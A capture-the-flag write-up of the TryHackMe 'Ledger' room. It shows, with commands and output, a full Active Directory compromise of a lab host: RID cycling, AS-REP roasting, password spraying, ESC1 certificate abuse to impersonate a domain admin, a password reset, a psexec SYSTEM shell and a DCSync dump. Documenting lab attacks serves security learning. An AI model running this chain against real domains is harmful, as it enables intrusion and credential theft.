# **Ledger | Tryhackme**

***
![](https://tenor.com/bc35S.gif)

## Difficulty = Hard

***


Nmap scan result -:

```bash
# Nmap 7.95 scan initiated Tue Jul 15 08:29:07 2025 as: /usr/lib/nmap/nmap --privileged -p- -sCV -T4 -v -oN nmap.txt -Pn 10.10.197.194
Nmap scan report for 10.10.197.194
Host is up (0.16s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 07:44:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:45:40+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:   eae1:9bc6:ffbf:ac19:f750:22bd:7186:943a
|_SHA-1: 5bd6:40fd:76e2:d5ab:3909:5bcc:7a4f:4f4c:f7c6:2e34
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-07-15T07:45:40+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:26:00
| Not valid after:  2028-05-12T07:35:59
| MD5:   c249:3bc6:fd31:f2aa:83cb:2774:bc66:9151
|_SHA-1: 397a:54df:c1ff:f9fd:57e4:a944:00e8:cfdb:6e3a:972b
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:45:40+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:   eae1:9bc6:ffbf:ac19:f750:22bd:7186:943a
|_SHA-1: 5bd6:40fd:76e2:d5ab:3909:5bcc:7a4f:4f4c:f7c6:2e34
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:45:40+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:   eae1:9bc6:ffbf:ac19:f750:22bd:7186:943a
|_SHA-1: 5bd6:40fd:76e2:d5ab:3909:5bcc:7a4f:4f4c:f7c6:2e34
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T07:45:40+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:   eae1:9bc6:ffbf:ac19:f750:22bd:7186:943a
|_SHA-1: 5bd6:40fd:76e2:d5ab:3909:5bcc:7a4f:4f4c:f7c6:2e34
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-15T07:45:40+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Issuer: commonName=labyrinth.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-14T07:16:24
| Not valid after:  2026-01-13T07:16:24
| MD5:   6553:82ec:6ec6:dd67:7004:bb41:357b:e05b
|_SHA-1: bbbb:747a:61ce:f536:7ea1:8c1c:cc46:3de3:688a:8a68
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49780/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-15T07:45:27
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 15 08:45:43 2025 -- 1 IP address (1 host up) scanned in 995.86 seconds
```


Check if the target is an **Active Directory** environment; which as shown belows verifies that this is an AD environment


```bash
❯ nxc smb 10.10.197.194
SMB         10.10.197.194   445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
```


Tried an **RID cycling** attack which enumerate user accounts through null sessions and the SIDs and got several usernames


```bash
❯ nxc smb 10.10.197.194 -u guest -p '' --rid-brute | grep -i sidtypeuser | awk -F'\' '{print $2}' | cut -d '(' -f1 >> users.txt

❯ wc -l users.txt
493 users.txt

❯ head users.txt
Administrator 
Guest 
krbtgt 
LABYRINTH$ 
greg 
SHANA_FITZGERALD 
CAREY_FIELDS 
DWAYNE_NGUYEN 
BRANDON_PITTMAN 
BRET_DONALDSON 
--SNIP--
```


Did an asreproast att&ck to request encrypted authentication responses for accounts in the domain that have Kerberos pre-authentication disabled


```bash
❯ GetNPUsers.py thm.local/ -usersfile users.txt -outputfile ASREProastables.txt -format hashcat -dc-ip 10.10.197.194
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set      
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set           
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User LABYRINTH$ doesn't have UF_DONT_REQUIRE_PREAUTH set    
[-] User greg doesn't have UF_DONT_REQUIRE_PREAUTH set             
[-] User SHANA_FITZGERALD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CAREY_FIELDS doesn't have UF_DONT_REQUIRE_PREAUTH set
--SNIP--
```

Got some valid users hashes in the output file

```bash
❯ head ASREProastables.txt
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:de39120dd4bb0fdd4becd642935f593b$8c082ef20f5d--SNIP--551cf381578d90bf8e93
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:d8976d8c3c36750ff15cc0fbb054f883$ff7afcc1a4a87f465872eb3--SNIP--3c6269c5
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:cef75c1342342929fad0c60d7c3398b5$5cc1a0d65ecf54326bd--SNIP--c7436e59aa2fe7a333f5bc3998fb
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:2f2117389ecafdd8611f698db494ba20$1bb07b877057c7--SNIP--66a9da07ba19dcfb74ded79081f89a1a
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:9564f0e67b17ccc700513c97485ec6ab$de12d030d0bc823ba84606a64266cc822--SNIP--ab7bc5b894

```


Tried cracking this hashes with John-the-Ripper but none could be cracked  


```bash
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:27 DONE (2025-07-15 09:36) 0g/s 97338p/s 486690c/s 486690C/s !!12Honey..*7¡Vamos!
Session completed. 
```


As a rule of thumb, checking user's description sometimes exposes password for users who store their password in this attribute, meanwhile `ldapsearch` has made this easy for us without authentication to the domain.


```bash
❯ ldapsearch -H ldap://10.10.197.194 -x -b "DC=THM,DC=LOCAL" -s sub "(&(objectclass=*))"  | grep description:

description: Default container for upgraded user accounts
description: Default container for upgraded computer accounts
description: Default container for domain controllers
description: Builtin system settings
description: Default container for orphaned objects
description: Please change it: ********
description: Tier 1 User                       
description: Tier 1 User
description: Please change it: ********
description: Tier 1 User

```


Got a password from the last action i made and password spray to see which users have this password in use (got 2 hit \m/)  



```bash
❯ nxc smb 10.10.197.194 -u users.txt -p '**********' --continue-on-success                                                                                                                 
SMB         10.10.197.194   445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)                             
SMB         10.10.197.194   445    LABYRINTH        [-] thm.local\Administrator:********** STATUS_ACCOUNT_RESTRICTION
SMB         10.10.197.194   445    LABYRINTH        [+] thm.local\IVY_WILLIS:**********
SMB         10.10.197.194   445    LABYRINTH        [-] thm.local\SOFIA_PATTERSON:********** STATUS_LOGON_FAILURE
SMB         10.10.197.194   445    LABYRINTH        [-] thm.local\VICENTE_BURT:********** STATUS_LOGON_FAILURE 
SMB         10.10.197.194   445    LABYRINTH        [-] thm.local\DIXIE_BERGER:********** STATUS_LOGON_FAILURE 
SMB         10.10.197.194   445    LABYRINTH        [-] thm.local\LIZ_WALTER:********** STATUS_LOGON_FAILURE 
SMB         10.10.197.194   445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:********** 
```


Since there is valid credentials at hand, check to see what services this users can access and got a RDP hit on user `SUSANNA_MCKNIGHT`


```bash
❯ nxc winrm 10.10.197.194 -u users_ack.txt -p '**********'

❯ nxc rdp 10.10.197.194 -u users_ack.txt -p '**********'
RDP         10.10.197.194   3389   LABYRINTH        [*] Windows 10 or Windows Server 2016 Build 17763 (name:LABYRINTH) (domain:thm.local) (nla:True)
RDP         10.10.197.194   3389   LABYRINTH        [+] thm.local\IVY_WILLIS:********** 
RDP         10.10.197.194   3389   LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:********** (Pwn3d!)
```


Logged-in using the `xfreerdp` utility and obtained the user flag, also noticed another user with a home folder called `BRADLEY_ORTIZ`


```bash
❯ xfreerdp /u:SUSANNA_MCKNIGHT /p:'********' /v:10.10.197.194 /cert-ignore
[10:15:19:951] [946868:946869] [ERROR][com.winpr.timezone] - StandardName conversion failed - using default
[10:15:19:553] [946868:946869] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[10:15:19:553] [946868:946869] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[10:15:19:634] [946868:946869] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[10:15:19:634] [946868:946869] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[10:15:21:628] [946868:946869] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```


![](https://i.imgur.com/YR9MmmJ.png)


Run the `b-p` collector to further analyze attack paths



```bash
❯ bloodhound-python -u IVY_WILLIS -p '********' -ns 10.10.197.194 -d thm.local -c all --zip --dns-timeout 100
INFO: Found AD domain: thm.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (labyrinth.thm.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 493 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: labyrinth.thm.local
INFO: Done in 01M 05S
INFO: Compressing output into 20250715095925_bloodhound.zip
```

Loaded `neo4j` and `bloodhound` to analyze the data gotten from the collector


![](https://i.imgur.com/449hGQo.png)


Checking group membership for `SUSANNA_MCKNIGHT`, this account belongs to the `CERTIFICATE SERVICE DCOM ACCESS` which grants members the ability to connect to and interact with Certification Authorities (CAs) within an enterprise/domain


![](https://i.imgur.com/0Cdfdps.png)


Also the user `BRADLEY_ORTIZ` belong's to the domain administrators group


![](https://i.imgur.com/mzdcpcG.png)



Run `certipy-ad` to find vulnerable templates in the `thm.local` domain

```bash
❯ certipy-ad find -u 'SUSANNA_MCKNIGHT' -p '**********' -dc-ip 10.10.197.194 -vulnerable -enabled
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA
[!] Got error while trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'thm-LABYRINTH-CA'
[*] Saved BloodHound data to '20250715104753_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250715104753_Certipy.txt'
[*] Saved JSON output to '20250715104753_Certipy.json'
```


Checking the output, the `ServerAuth` template is vulnerable to ESC1 


```
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```



With the help of this [blog](https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/) from **Redfox**, was able to request a certificate for the domain admin user `BRADLEY_ORTIZ@thm.local`.


```bash
❯ certipy-ad req -dc-ip 10.10.197.194 -u susanna_mcknight@thm.local -p '**********' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn BRADLEY_ORTIZ@thm.local -dns labyrinth.thm.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\('
  "(0x[a-zA-Z0-9]+) \([-]?[0-9]+ ",
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 25
[*] Got certificate with multiple identifications
    UPN: 'BRADLEY_ORTIZ@thm.local'
    DNS Host Name: 'labyrinth.thm.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'bradley_ortiz_labyrinth.pfx'
```

However trying to authenticate against the domain controller using the certificate a "KDC_ERR_PADATA_TYPE_NOSUPP" error which means

> PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) is not supported/enabled on the Domain Controller (DC), most likely because:

- There’s no certificate installed on the DC from ADCS (Active Directory Certificate Services), or

- The DC is not configured to accept smartcard/certificate-based logons.


```
❯ certipy-ad auth -pfx bradley_ortiz_labyrinth.pfx -dc-ip 10.10.197.194 -username BRADLEY_ORTIZ -domain thm.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)
[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'BRADLEY_ORTIZ@thm.local'
    [1] DNS Host Name: 'labyrinth.thm.local'
> 0
[*] Using principal: bradley_ortiz@thm.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Was able to bypass the certificate auth limitation by falling back to LDAPS(authentication through TLS) as stated in this [github issue](https://github.com/ly4k/Certipy/issues/205) then changed the password for the user `BRADLEY_ORTIZ` since they belong to the DA group also.



```bash
❯ certipy-ad auth -ldap-shell -pfx bradley_ortiz_labyrinth.pfx -dc-ip 10.10.197.194 -username BRADLEY_ORTIZ -domain thm.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.10.197.194:636'
[*] Authenticated to '10.10.197.194' as: u:THM\BRADLEY_ORTIZ
Type help for list of commands

# help

 --SNIP--
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 --SNIP

# change_password BRADLEY_ORTIZ Password123
Got User DN: CN=BRADLEY_ORTIZ,OU=FSR,OU=Tier 1,DC=thm,DC=local
Attempting to set new password of: Password123
Password changed successfully!
```


Confirmation that the password was successfully changed whereby compromising the domain


```bash
❯ nxc smb 10.10.197.194 -u BRADLEY_ORTIZ -p Password123
SMB         10.10.197.194   445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False) 
SMB         10.10.197.194   445    LABYRINTH        [+] thm.local\BRADLEY_ORTIZ:Password123 (Pwn3d!)
```

Logged-in as shown below and we have administrative access to the domain


```bash
❯ rlwrap psexec.py BRADLEY_ORTIZ@10.10.197.194                                                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
Password:***********                         
Password:                                    
[*] Requesting shares on 10.10.197.194.....
[*] Found writable share ADMIN$
[*] Uploading file CKuXacJI.exe    
[*] Opening SVCManager on 10.10.197.194.....
[*] Creating service PKHP on 10.10.197.194..... 
[*] Starting service PKHP.....
[!] Press help for extra shell commands     
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd \Users\Admini*
C:\Users\Administrator> whoami && hostname && ipconfig
nt authority\system
labyrinth

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::2c68:e113:644b:d6cb%4
   IPv4 Address. . . . . . . . . . . : 10.10.197.194
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:0:14be:4c8:284a:2a2:f5f5:3a3d
   Link-local IPv6 Address . . . . . : fe80::284a:2a2:f5f5:3a3d%7
   Default Gateway . . . . . . . . . : ::
```


To maintain persistence, performed a DNS replication(DCSync) att&ck


```bash
❯ secretsdump.py thm.local/BRADLEY_ORTIZ:Password123@10.10.197.194
```


![](https://i.imgur.com/Ij6MZZd.png)


GG 🙂🤪

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>